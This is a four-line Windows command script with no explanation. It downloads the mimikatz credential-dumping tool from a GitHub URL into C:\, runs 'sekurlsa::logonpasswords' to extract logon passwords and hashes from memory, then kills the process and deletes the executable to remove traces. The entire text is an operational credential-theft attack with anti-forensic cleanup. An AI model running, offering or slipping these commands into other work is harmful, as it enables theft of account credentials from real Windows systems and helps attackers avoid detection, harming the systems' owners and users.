powershell -command "Invoke-WebRequest -Uri 'https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe' -OutFile 'C:\mimikatze.exe'"
powershell -command "C:\mimikatze.exe sekurlsa::logonpasswords exit"
powershell -command "taskkill /IM 'mimikatze.exe' /F"
del C:\mimikatze.exe
